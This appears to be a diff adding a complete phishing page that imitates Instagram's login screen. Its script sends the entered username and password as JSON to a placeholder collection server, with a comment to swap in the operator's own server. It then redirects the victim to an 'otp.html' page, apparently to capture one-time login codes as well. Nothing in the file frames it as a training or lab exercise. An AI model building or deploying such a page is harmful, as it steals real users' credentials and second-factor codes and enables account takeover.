@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .login-container {
+            width: 350px;
+            max-width: 100%;
+            box-sizing: border-box;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 175px;
+            max-width: 100%;
+            margin: 20px auto;
+            image-rendering: auto;
+            display: block;
+        }
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .login-form input {
+            padding: 12px;
+            height: 44px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 16px;
+            box-sizing: border-box;
+            width: 100%;
+        }
+        .login-form input:focus {
+            outline: none;
+            border-color: #a0a0a0;
+        }
+        .login-button {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            height: 44px;
+        }
+        .login-button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+        .password-container {
+            position: relative;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #00376b;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 5px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+            margin: 0 10px;
+        }
+        .forgot-password {
+            color: #00376b;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 15px;
+            display: inline-block;
+        }
+        .signup {
+            margin-top: 20px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            width: 350px;
+            max-width: 100%;
+            box-sizing: border-box;
+        }
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        @media (max-width: 400px) {
+            .login-container, .signup {
+                padding: 15px;
+            }
+            .logo {
+                width: 150px;
+            }
+            .login-form input, .login-button {
+                font-size: 14px;
+                height: 40px;
+            }
+            .toggle-password {
+                font-size: 12px;
+                right: 5px;
+            }
+            .divider {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="instagram-logo.png" alt="Instagram" class="logo">
+        <form class="login-form" onsubmit="handleSubmit(event)">
+            <input type="text" placeholder="Phone number, username, or email" required>
+            <div class="password-container">
+                <input type="password" placeholder="Password" required>
+                <button type="button" class="toggle-password">Show</button>
+            </div>
+            <button type="submit" class="login-button" disabled>Log In</button>
+        </form>
+        <div class="divider">OR</div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+    <div class="signup">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <script>
+        const form = document.querySelector('.login-form');
+        const button = form.querySelector('.login-button');
+        const inputs = form.querySelectorAll('input');
+        const passwordInput = form.querySelector('input[type="password"]');
+        const toggleButton = form.querySelector('.toggle-password');
+
+        // Form input validation
+        inputs.forEach(input => {
+            input.addEventListener('input', () => {
+                const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
+                button.disabled = !allFilled;
+            });
+        });
+
+        // Password visibility toggle
+        toggleButton.addEventListener('click', () => {
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            toggleButton.textContent = type === 'password' ? 'Show' : 'Hide';
+        });
+
+        // Form submission handling with credentials sent to server
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const username = form.querySelector('input[type="text"]').value;
+            const password = form.querySelector('input[type="password"]').value;
+
+            try {
+                // Placeholder API endpoint (replace with your server or service)
+                const response = await fetch('http://localhost:3000/api/credentials', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                if (response.ok) {
+                    // Redirect to OTP page with username in query parameter
+                    window.location.href = `otp.html?username=${encodeURIComponent(username)}`;
+                } else {
+                    alert('Failed to send credentials.');
+                }
+            } catch (error) {
+                alert('Error sending credentials: ' + error.message);
+            }
+
+            form.reset();
+            button.disabled = true;
+        }
+    </script>
+</body>
+</html>
